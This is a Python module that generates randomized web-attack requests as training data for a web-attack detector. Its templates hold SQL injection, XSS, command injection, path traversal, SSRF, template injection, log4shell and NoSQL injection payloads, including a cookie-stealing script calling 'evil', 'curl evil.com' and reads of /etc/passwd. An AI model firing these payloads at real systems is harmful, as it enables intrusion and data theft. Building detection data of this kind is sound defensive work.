"""Modern attack traffic generator (randomized, DISTINCT from the frozen harness eval corpus).

Pairs with data_pipeline/modern_benign.py. The CSIC-only model treats ALL modern traffic —
benign AND attack — as out-of-distribution, so it can't judge it. To give the model a modern
decision boundary it must see modern examples of BOTH classes. This generates diverse,
randomized web-attack payloads across families with varied values, so the model learns the
modern attack manifold without memorizing specific records (the held-out eval corpus still
tests generalization).

    from data_pipeline.modern_attacks import generate
    records = generate(3000, seed=11)   # list of (method, path, query, body)
"""
from __future__ import annotations

import random
from typing import List, Tuple

Record = Tuple[str, str, str, str]

_TABLES = ["users", "accounts", "customers", "admin", "sessions", "orders", "payments", "tokens"]
_COLS = ["password", "passwd", "pwd", "email", "ssn", "card", "secret", "api_key", "hash"]
_PARAMS = ["id", "q", "search", "name", "user", "file", "path", "url", "next", "cat", "page"]
_CMDS = ["cat /etc/passwd", "id", "whoami", "uname -a", "ls -la /", "curl evil.com", "wget http://x/s"]
_HOSTS = ["127.0.0.1", "localhost", "169.254.169.254", "0177.0.0.1", "2130706433", "[::1]"]


def _one(r) -> List[Record]:
    p = r.choice(_PARAMS)
    t, col = r.choice(_TABLES), r.choice(_COLS)
    n = r.randint(1, 9999)
    out: List[Record] = []
    # SQLi variants
    out.append(("GET", "/", f"{p}={n}' OR '{r.randint(1,9)}'='{r.randint(1,9)}", ""))
    out.append(("GET", "/api/items", f"{p}={n} UNION SELECT {col} FROM {t}-- -", ""))
    out.append(("POST", "/search", "", f'{{"{p}":"{n} OR 1=1","sort":"{col}"}}'))
    out.append(("GET", "/", f"{p}={n}'/**/AND/**/{r.randint(1,5)}=SLEEP({r.randint(1,9)})", ""))
    # XSS variants
    h = r.choice(["onerror", "onload", "onpointerover", "onfocus", "ontoggle"])
    tag = r.choice(["img", "svg", "div", "details", "iframe"])
    out.append(("GET", "/", f"{p}=<{tag} {h}=alert({n})>", ""))
    out.append(("POST", "/comment", "", f"{p}=<script>fetch('//evil/'+document.cookie)//{n}</script>"))
    # RCE
    c = r.choice(_CMDS)
    out.append(("POST", "/run", "", f"{p}=;{c}"))
    out.append(("GET", "/exec", f"{p}=$({c.replace(' ', '${IFS}')})", ""))
    # traversal / LFI
    depth = r.randint(2, 6)
    out.append(("GET", "/", f"{p}={'../' * depth}etc/passwd", ""))
    # SSRF
    out.append(("GET", "/fetch", f"url=http://{r.choice(_HOSTS)}:{r.choice([80,6379,8080,169])}/{col}", ""))
    # SSTI / log4shell / nosql
    out.append(("GET", "/", f"{p}={{{{{r.randint(1,9)}*{r.randint(1,9)}}}}}", ""))
    out.append(("GET", "/", f"{p}=${{jndi:ldap://evil{n}.com/{col}}}", ""))
    out.append(("POST", "/login", "", f'{{"user":{{"$gt":""}},"{col}":{{"$ne":null}}}}'))
    return out


def generate(n: int = 3000, seed: int = 11) -> List[Record]:
    r = random.Random(seed)
    out: List[Record] = []
    while len(out) < n:
        out.extend(_one(r))
    return out[:n]


if __name__ == "__main__":
    for m, p, q, b in generate(15, seed=2):
        print(f"{m:5s} {p:14s} q={q[:44]!r} b={b[:40]!r}")
